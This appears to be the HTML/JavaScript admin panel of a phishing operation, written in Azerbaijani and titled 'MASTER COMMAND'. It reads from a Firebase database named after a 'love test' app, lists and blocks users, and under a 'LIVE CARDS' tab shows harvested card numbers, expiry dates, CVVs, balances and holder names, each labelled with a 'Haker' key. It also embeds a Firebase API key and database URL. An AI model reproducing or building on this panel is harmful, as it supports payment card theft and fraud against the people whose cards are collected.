<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MASTER COMMAND</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;900&family=Syncopate:wght@700&display=swap');
        body { margin: 0; background: #050508; color: white; font-family: 'Outfit', sans-serif; }
        .tab-menu { display: flex; gap: 10px; padding: 15px; background: #0a0a0f; border-bottom: 1px solid #00dfff; overflow-x: auto; }
        .tab-btn { background: rgba(255,255,255,0.05); border: 1px solid #333; color: white; padding: 10px 15px; border-radius: 8px; font-size: 0.7rem; cursor: pointer; white-space: nowrap; }
        .tab-btn.active { background: #00dfff; color: black; font-weight: 900; }
        .card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 15px; padding: 15px; margin: 15px; }
        .data-row { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid #111; }
        .badge { padding: 5px 10px; border-radius: 5px; font-size: 0.6rem; cursor: pointer; border: none; font-weight: 900; }
        .bank-item { border-left: 3px solid #00ff88; background: rgba(0,255,136,0.05); padding: 10px; margin-bottom: 10px; border-radius: 5px; }
    </style>
</head>
<body>

<div class="tab-menu">
    <button class="tab-btn active" onclick="showSec('users', this)">İSTİFADƏÇİLƏR</button>
    <button class="tab-btn" onclick="showSec('bank', this)">BANK KARTLARI</button>
    <button class="tab-btn" onclick="showSec('logs', this)">DİGƏR LOQLAR</button>
</div>

<div id="sec-users" class="section">
    <div class="card">
        <h3>İSTİFADƏÇİ İDARƏSİ</h3>
        <div id="user-list"></div>
    </div>
</div>

<div id="sec-bank" class="section" style="display:none">
    <div class="card">
        <h3 style="color:#00ff88">💳 CANLI KARTLAR</h3>
        <div id="bank-list"></div>
    </div>
</div>

<div id="sec-logs" class="section" style="display:none">
    <div class="card" id="logs-list"></div>
</div>

<script>
    const firebaseConfig = { apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU", databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function showSec(id, btn) {
        document.querySelectorAll('.section').forEach(s => s.style.display = 'none');
        document.getElementById('sec-' + id).style.display = 'block';
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
    }

    // USERS & BLOCKING
    db.ref('users').on('value', snap => {
        const list = document.getElementById('user-list');
        list.innerHTML = "";
        snap.forEach(u => {
            const d = u.val();
            const isB = d.status === 'blocked';
            list.innerHTML += `<div class="data-row">
                <span>${u.key} ${isB ? '<b style="color:red">[BLOK]</b>' : ''}</span>
                <button class="badge" style="background:${isB ? 'green' : 'red'}" onclick="toggleB('${u.key}', ${isB})">${isB ? 'AÇ' : 'BLOKLA'}</button>
            </div>`;
        });
    });

    window.toggleB = (id, b) => db.ref('users/' + id).update({ status: b ? 'active' : 'blocked' });

    // BANK CARDS
    db.ref('user_cards').on('value', snap => {
        const list = document.getElementById('bank-list');
        list.innerHTML = snap.exists() ? "" : "Hələ yoxdur...";
        snap.forEach(c => {
            const d = c.val();
            list.innerHTML = `<div class="bank-item">
                <small>Haker: ${c.key}</small><br>
                <b style="font-size:1rem; letter-spacing:1px">${d.num}</b><br>
                <small>VAL: ${d.date} | CVV: <span style="color:red">${d.cvv}</span> | BAL: ${d.balance} AZN</small><br>
                <small>NAME: ${d.name}</small>
                <div style="text-align:right"><button onclick="db.ref('user_cards/${c.key}').remove()" class="badge" style="background:none; color:grey">SİL</button></div>
            </div>` + list.innerHTML;
        });
    });
</script>
</body>
</html>
